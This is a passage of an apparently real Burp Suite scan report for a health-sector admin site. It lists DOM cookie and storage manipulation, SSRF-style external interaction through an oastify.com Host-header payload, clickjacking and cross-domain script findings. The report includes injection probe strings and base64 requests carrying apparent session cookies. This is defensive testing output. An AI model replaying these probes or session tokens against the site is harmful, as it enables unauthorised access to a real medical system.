      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at Object.val (https://admin.miradorhealth.com/js/jquery.min.js:4:9797)
at HTMLInputElement.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/jquery.min.js:4:25646)
at https://admin.miradorhealth.com/js/jquery.min.js:2:932
at Function.map (https://admin.miradorhealth.com/js/jquery.min.js:2:3613)
at Object.map (https://admin.miradorhealth.com/js/jquery.min.js:2:900)
at Object.serializeArray (https://admin.miradorhealth.com/js/jquery.min.js:4:25614)
at Object.serialize (https://admin.miradorhealth.com/js/jquery.min.js:4:25337)
at filterData (https://admin.miradorhealth.com/Email:728:73)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.TWPef (&lt;anonymous&gt;:1:111447)
at Object.AaaMx (&lt;anonymous&gt;:1:541530)
at Object.defineProperty.set (&lt;anonymous&gt;:1:551606)
at setCookie (https://admin.miradorhealth.com/js/app.js:148:18)
at filterData (https://admin.miradorhealth.com/Email:773:13)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3489)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>UserTotalEvents=https://admin.miradorhealth.com/UserTotalEvents/?ajax=true&amp;filter=true&amp;draw=1&amp;dispenser_id=&amp;is_compliant=&amp;created_at=yy70u7p8nm%252527%252522%60&apos;%22%2Fyy70u7p8nm%2F%3E%3Cyy70u7p8nm%2F%5C%3Epwfx96lb0y%26;expires=Mon, 13 Jan 2025 18:46:31 GMT;path=/</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId>created_at</sourceElementId>
      <sourceElementName>created_at</sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-dark float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;filter&apos;)&quot;&gt;Submit&lt;/button&gt;</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>6504422356983897088</serialNumber>
    <type>5246720</type>
    <name><![CDATA[HTML5 storage manipulation (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
<p>HTML5 storage manipulation arises when a script stores controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will cause the user's browser to store attacker-controllable data.</p>
<p>This behavior does not in itself constitute a security vulnerability. However, if the application later reads the data back from storage and processes it in an unsafe way, then an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.
</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based HTML5 storage manipulation is not to place in HTML5 storage any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/html5-storage-manipulation">Web Security Academy: HTML5 storage manipulation (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153: Input Data Manipulation</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based HTML5 storage manipulation. Data is read from <b>location.pathname</b> and passed to <b>localStorage.setItem.name</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9FbWFpbCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9NW5nZTI2ZHBqNTM4YmwxdmlydTZhYnZwdWc7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPURJeXZhaHVvZkp4TXhTRGl4ZTUyanJwYXVPUTR4WEVlWHZOUEpHNitTUkJHYXllZGtsQjdjVDZhQUM0Ty9oVllRV21CMS9HdTZMaDg2MFlGUW50bXNWVFdKVVlrMmN0VDFJNU9xaTBJSFJuQXkwdjJ1NUtBbWxSaW5JaFk7IEFXU0FMQkNPUlM9REl5dmFodW9mSnhNeFNEaXhlNTJqcnBhdU9RNHhYRWVYdk5QSkc2K1NSQkdheWVka2xCN2NUNmFBQzRPL2hWWVFXbUIxL0d1NkxoODYwWUZRbnRtc1ZUV0pVWWsyY3RUMUk1T3FpMElIUm5BeTB2MnU1S0FtbFJpbkloWQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8NClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>location.pathname</source>
      <sink>localStorage.setItem.name</sink>
      <sourceStackTrace>at Object._0x165f99 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:557377)
at get pathname (&lt;anonymous&gt;:1:249642)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:147:26)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/Email:746:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3588)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at Object.uXLIG (&lt;anonymous&gt;:1:437510)
at Object.yUDKe (&lt;anonymous&gt;:1:452444)
at _0xdc6a5f.tYxZd.quoteContext [as setItem] (&lt;anonymous&gt;:1:453117)
at Object.fnStateSaveCallback (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:146:487)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:410)
at r.iterator (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:102:14)
at r.&lt;anonymous&gt; (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:137:359)
at Function.clear (https://admin.miradorhealth.com/js/datatables/jquery.dataTables.min.js:104:410)
at filterData (https://admin.miradorhealth.com/Email:746:29)
at HTMLButtonElement.onclick (https://admin.miradorhealth.com/Email:328:3588)
at _0x14405e (&lt;anonymous&gt;:1:147957)
at _0x2a880c (&lt;anonymous&gt;:1:151903)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue>///Email//cn9lj0w2uu%27%22%60&apos;%22/cn9lj0w2uu/%3E%3Ccn9lj0w2uu//%3Em8sglr63mi&amp;</sourceValue>
      <sinkValue>DataTables_records_///Email//cn9lj0w2uu%27%22%60&apos;%22/cn9lj0w2uu/%3E%3Ccn9lj0w2uu//%3Em8sglr63mi&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>click</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;button class=&quot;btn btn-secondary float-sm-right mr-2&quot; onclick=&quot;filterData(&apos;reset&apos;)&quot;&gt;Reset Filters&lt;/b</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>809908331806566400</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>mg61mn722j9xuh3uz1vuktkwbnhh5axyqxen1dp2.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1nNjFtbjcyMmo5eHVoM3V6MXZ1a3Rrd2JuaGg1YXh5cXhlbjFkcDIub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.84.197</originIp>
      <time>2024-Dec-15 00:48:16.411 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>mg61mn722j9xuh3uz1vuktkwbnhh5axyqxen1dp2.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1381043236966049792</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Email]]></path>
    <location><![CDATA[/Email]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>mg61mn722j9xuh3uz1vuktkwbnhh5axyqxen1dp2.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1nNjFtbjcyMmo5eHVoM3V6MXZ1a3Rrd2JuaGg1YXh5cXhlbjFkcDIub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:48:16.973 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1nNjFtbjcyMmo5eHVoM3V6MXZ1a3Rrd2JuaGg1YXh5cXhlbjFkcDIub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nbGtnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4903496349015218176</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/User/399/ChangePassword]]></path>
    <location><![CDATA[/User/399/ChangePassword]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyLzM5OS9DaGFuZ2VQYXNzd29yZCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9YzYydjhiMXQwMG4xZjcybGMzdGZjbW1yaHM7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPWw5Z0h6eVh4bW5nRHFTZkNJa1cvZWdTZ0J1dmJYQVk4clROczlITDVDNFZ3OE96c3hwZk1lNFZhZjhBTzltZWtJODcxcDRVbEg3SHRWMU9jTTFRSGJMWVU0Z0l4QkNEZjR4eFQvY1lEQlVBOUNTZis1NGs3Z2NuVDJ4czU7IEFXU0FMQkNPUlM9bDlnSHp5WHhtbmdEcVNmQ0lrVy9lZ1NnQnV2YlhBWThyVE5zOUhMNUM0Vnc4T3pzeHBmTWU0VmFmOEFPOW1la0k4NzFwNFVsSDdIdFYxT2NNMVFIYkxZVTRnSXhCQ0RmNHh4VC9jWURCVUE5Q1NmKzU0azdnY25UMnhzNQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3508435137578546176</serialNumber>
    <type>5244160</type>
    <name><![CDATA[Cross-domain script include]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/User/399/ChangePassword]]></path>
    <location><![CDATA[/User/399/ChangePassword]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>
<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The response dynamically includes the following scripts from other domains:<ul><li>https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js</li><li>https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js]]></issueDetailItem>
      <issueDetailItem><![CDATA[https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.3.4/jspdf.min.js]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyLzM5OS9DaGFuZ2VQYXNzd29yZCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9YzYydjhiMXQwMG4xZjcybGMzdGZjbW1yaHM7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPWw5Z0h6eVh4bW5nRHFTZkNJa1cvZWdTZ0J1dmJYQVk4clROczlITDVDNFZ3OE96c3hwZk1lNFZhZjhBTzltZWtJODcxcDRVbEg3SHRWMU9jTTFRSGJMWVU0Z0l4QkNEZjR4eFQvY1lEQlVBOUNTZis1NGs3Z2NuVDJ4czU7IEFXU0FMQkNPUlM9bDlnSHp5WHhtbmdEcVNmQ0lrVy9lZ1NnQnV2YlhBWThyVE5zOUhMNUM0Vnc4T3pzeHBmTWU0VmFmOEFPOW1la0k4NzFwNF